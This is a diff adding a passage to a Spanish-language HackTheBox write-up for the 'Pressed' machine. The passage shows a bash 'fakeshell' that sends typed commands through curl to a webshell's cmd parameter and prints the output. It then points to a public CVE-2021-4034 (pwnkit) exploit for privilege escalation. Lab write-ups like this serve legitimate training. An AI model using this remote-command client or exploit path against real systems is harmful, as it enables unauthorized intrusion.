@@ -324,6 +324,31 @@ True
 
 `http://pressed.htb/index.php/2022/01/28/hello-world/?cmd=whoami`
 
+### ahora tenemos consultas a los directorios del servidor para eso podemos hacer una fakeshell.
 
+```
+#!/bin/bash
 
+function control_c(){
+    echo -e "\n\n[!]Saliendo..\n"
+    exit 1
+}
+
+#Control-C
+trap control_c INT
+
+main_url='http://pressed.htb/index.php/2022/01/28/hello-world/?cmd='
+
+while [ "$command" != "exit"  ]; do
+    echo -n "$~ " && read -r command
+    command="$(echo "$command 2>%261" | tr ' ' '+')"
+
+    curl -s -X GET "$main_url$command" | grep "<pre>" -A 100 | grep "</pre>" -B 100 | sed 's/<pre>//' | sed 's/<\/pre>//'
+
+done
+
+```
+### Teniendo las consultas podemos abusar de la vulnerabilidad `CVE-2021-4034`
+
+https://github.com/kimusan/pkwner?tab=readme-ov-file
 
